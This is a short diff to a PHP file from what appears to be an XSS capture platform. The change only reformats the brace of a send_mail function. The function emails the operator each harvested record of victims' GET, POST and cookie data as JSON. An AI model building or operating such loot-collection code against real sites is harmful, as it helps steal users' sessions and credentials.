@@ -6,8 +6,7 @@ if (!defined('IN_XSS_PLATFORM')) {
 require_once("PHPMailer/PHPMailerAutoload.php");
 require_once("load.php");
 
-function send_mail($xss_record_json)
-{
+function send_mail($xss_record_json) {
     $subject = "GET:" . count($xss_record_json['get_data']) . "个 POST:" . count($xss_record_json['post_data']) . "个 Cookie:" . count($xss_record_json['cookie_data']) . "个";
     
     $body = json_encode($xss_record_json, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
